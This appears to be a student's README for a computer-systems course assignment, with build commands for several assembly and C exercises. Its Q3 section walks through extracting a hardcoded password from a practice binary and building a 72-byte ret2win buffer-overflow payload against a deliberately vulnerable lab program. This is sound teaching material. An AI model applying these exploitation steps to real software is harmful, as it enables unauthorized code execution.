[![Review Assignment Due Date](https://classroom.github.com/assets/deadline-readme-button-22041afd0340ce965d47ae6ef1cefeee28c7c493a6346c4f15d667ab976d596c.svg)](https://classroom.github.com/a/d5nOy1eX)

# Assignment 2: Build and Run Commands

Run all commands from the repository root:

```bash
cd "/home/divyansh/Semester4/CSO/assignment /ass2/assignment-2-Divyansh-Atri"
```

## Prerequisites

```bash
sudo dnf update
sudo dnf install -y build-essential gdb binutils python3
```

---

## Q1: BST in x86-64 Assembly (`q1/q1.s`)

`q1.s` defines functions (`make_node`, `insert`, `get`, `getAtMost`) and is usually linked with a C test driver.

### Compile assembly to object

```bash
gcc -c q1/q1.s -o q1/q1.o
```

### (Optional) Link with your own test file

If you have a C test file like `q1/test_q1.c`:

```bash
gcc q1/test_q1.c q1/q1.o -o q1/q1_test
./q1/q1_test
```

---

## Q2: Next Greater Element in Assembly (`q2/q2.s`)

### Compile

```bash
gcc -no-pie q2/q2.s -o q2/q2
```

### Run

Pass integers as command-line arguments:

```bash
./q2/q2 4 5 2 25
./q2/q2 13 7 6 12
```

---

## Q3: Reverse Engineering + Payload Files

> Both binaries are pre-built by the GitHub Actions workflow and placed at
> `q3/a/target_Divyansh-Atri` and `q3/b/target_Divyansh-Atri`.
> The full disassembly of each binary is saved in `q3/a/dump.txt` and `q3/b/dump.txt`.

---

### Part A — Password Reverse Engineering (`q3/a/payload.txt`)

#### Step 1: Check binary type

```bash
file q3/a/target_Divyansh-Atri
# ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped
```

#### Step 2: Dump readable strings from the binary

```bash
strings q3/a/target_Divyansh-Atri
```

This immediately revealed the hardcoded password in plaintext:

```
D!vy4nsh_4tr1
Access granted!
Wrong password!
```

#### Step 3: Confirm with objdump disassembly

```bash
objdump -d q3/a/target_Divyansh-Atri > q3/a/dump.txt
```

Key section in `main` (at `0x400496`):

```asm
; fgets(input, 256, stdin)
4004b7:  call   400390 <fgets@plt>

; strcspn to strip newline
4004cb:  call   400380 <strcspn@plt>

; strcmp(input, 0x40126a)   ← address of the password string
4004df:  mov    $0x40126a,%esi
4004e4:  mov    %rax,%rdi
4004e7:  call   4003a0 <strcmp@plt>

; if strcmp == 0 → "Access granted!" else "Wrong password!"
4004ec:  test   %eax,%eax
4004ee:  jne    4004fc
4004f0:  mov    $0x401278,%edi   ; "Access granted!"
4004f5:  call   400370 <puts@plt>
```

The password string at `0x40126a` is `D!vy4nsh_4tr1` — exactly what `strings` found.

#### Step 4: Write the password to payload.txt

```bash
echo "D!vy4nsh_4tr1" > q3/a/payload.txt
```

#### Step 5: Verify

```bash
./q3/a/target_Divyansh-Atri < q3/a/payload.txt
# Access granted!
```

---

### Part B — Buffer Overflow (`q3/b/payload`)

The binary has an intentional stack buffer overflow that we exploit to redirect
execution to the hidden `win()` function.

#### Step 1: Disassemble the binary

```bash
objdump -d q3/b/target_Divyansh-Atri > q3/b/dump.txt
```

Relevant functions extracted from the disassembly:

```asm
0000000000400486 <win>:
  400486:  push   %rbp
  400487:  mov    %rsp,%rbp
  40048a:  mov    $0x4011e8,%edi   ; "You win!"
  40048f:  call   400370 <puts@plt>
  400494:  mov    $0x0,%edi
  400499:  call   400390 <exit@plt>

000000000040049e <vuln>:
  40049e:  push   %rbp
  40049f:  mov    %rsp,%rbp
  4004a2:  sub    $0x40,%rsp          ← allocates 64 bytes (0x40) for buf
  4004a6:  lea    -0x40(%rbp),%rax    ← buf starts at rbp - 0x40
  4004aa:  mov    $0xc8,%edx          ← reads 200 bytes (0xc8)!
  4004af:  mov    %rax,%rsi
  4004b2:  mov    $0x0,%edi
  4004b7:  call   400380 <read@plt>   ← read(0, buf, 200) — intentional overflow
  4004bc:  nop
  4004bd:  leave
  4004be:  ret                        ← return address is what we overwrite
```

#### Step 2: Calculate the overflow offset

The stack frame inside `vuln()` looks like this:

```
Low address
┌──────────────────┐  ← buf starts here  (rbp - 0x40)
│   buf[64 bytes]  │
│                  │
├──────────────────┤  ← rbp  (saved base pointer, 8 bytes)
│  saved RBP       │
├──────────────────┤  ← rbp + 8
│  return address  │  ← we want to overwrite THIS with win()
└──────────────────┘
High address
```

- Buffer size: **64 bytes** (`sub $0x40,%rsp`)
- Saved RBP:   **8 bytes**
- **Total padding before return address = 64 + 8 = 72 bytes**

#### Step 3: Find the address of `win()`

From the disassembly above:

```
win() is at 0x0000000000400486
```

The binary is compiled with `-no-pie -fno-PIE` so this address is fixed (no ASLR for
the binary itself).

#### Step 4: Generate the payload

```bash
python3 -c "
import struct
# 72 bytes of padding + win() address in little-endian (8 bytes)
payload = b'A' * 72 + struct.pack('<Q', 0x400486)
with open('q3/b/payload', 'wb') as f:
    f.write(payload)
print(f'Payload: {len(payload)} bytes written')
"
```

Payload breakdown (hex):

```
4141...41  (72 bytes of 'A' — fills buf + saved rbp)
8604400000000000  (0x400486 in little-endian — jumps to win())
```

#### Step 5: Verify

```bash
./q3/b/target_Divyansh-Atri < q3/b/payload
# You win!
```

The return address of `vuln()` is overwritten with `0x400486`, so when `ret`
executes, it jumps straight into `win()` instead of returning to `main()`.

---

## Q4: Dynamic Shared Library Calculator (`q4/q4.c`)

### Compile main program

```bash
gcc q4/q4.c -ldl -o q4/q4
```

### Build operation libraries

Create one shared library per operation (example files shown below).

```bash
cat > q4/add.c << 'EOF'
int add(int a, int b) { return a + b; }
EOF

cat > q4/sub.c << 'EOF'
int sub(int a, int b) { return a - b; }
EOF

cat > q4/mul.c << 'EOF'
int mul(int a, int b) { return a * b; }
EOF

cat > q4/div.c << 'EOF'
int div(int a, int b) { return (b == 0) ? 0 : a / b; }
EOF

gcc -shared -fPIC q4/add.c -o q4/libadd.so
gcc -shared -fPIC q4/sub.c -o q4/libsub.so
gcc -shared -fPIC q4/mul.c -o q4/libmul.so
gcc -shared -fPIC q4/div.c -o q4/libdiv.so
```

### Run (from inside `q4` so `./lib<op>.so` is found)

```bash
cd q4
echo "add 10 20" | ./q4
printf "add 10 20\nsub 9 3\nmul 7 8\ndiv 100 5\n" | ./q4
cd ..
```

---

## Q5: Palindrome Check in O(1) Extra Space (`q5/q5.s`)

### Compile

```bash
gcc -no-pie q5/q5.s -o q5/q5
```

### Run

Program reads `input.txt` from the current working directory.

```bash
echo "racecar" > q5/input.txt
cd q5
./q5
cd ..
```

Try non-palindrome:

```bash
echo "hello" > q5/input.txt
cd q5
./q5
cd ..
```

---

## Quick Rebuild Commands

```bash
gcc -c q1/q1.s -o q1/q1.o
gcc -no-pie q2/q2.s -o q2/q2
gcc q4/q4.c -ldl -o q4/q4
gcc -no-pie q5/q5.s -o q5/q5
```
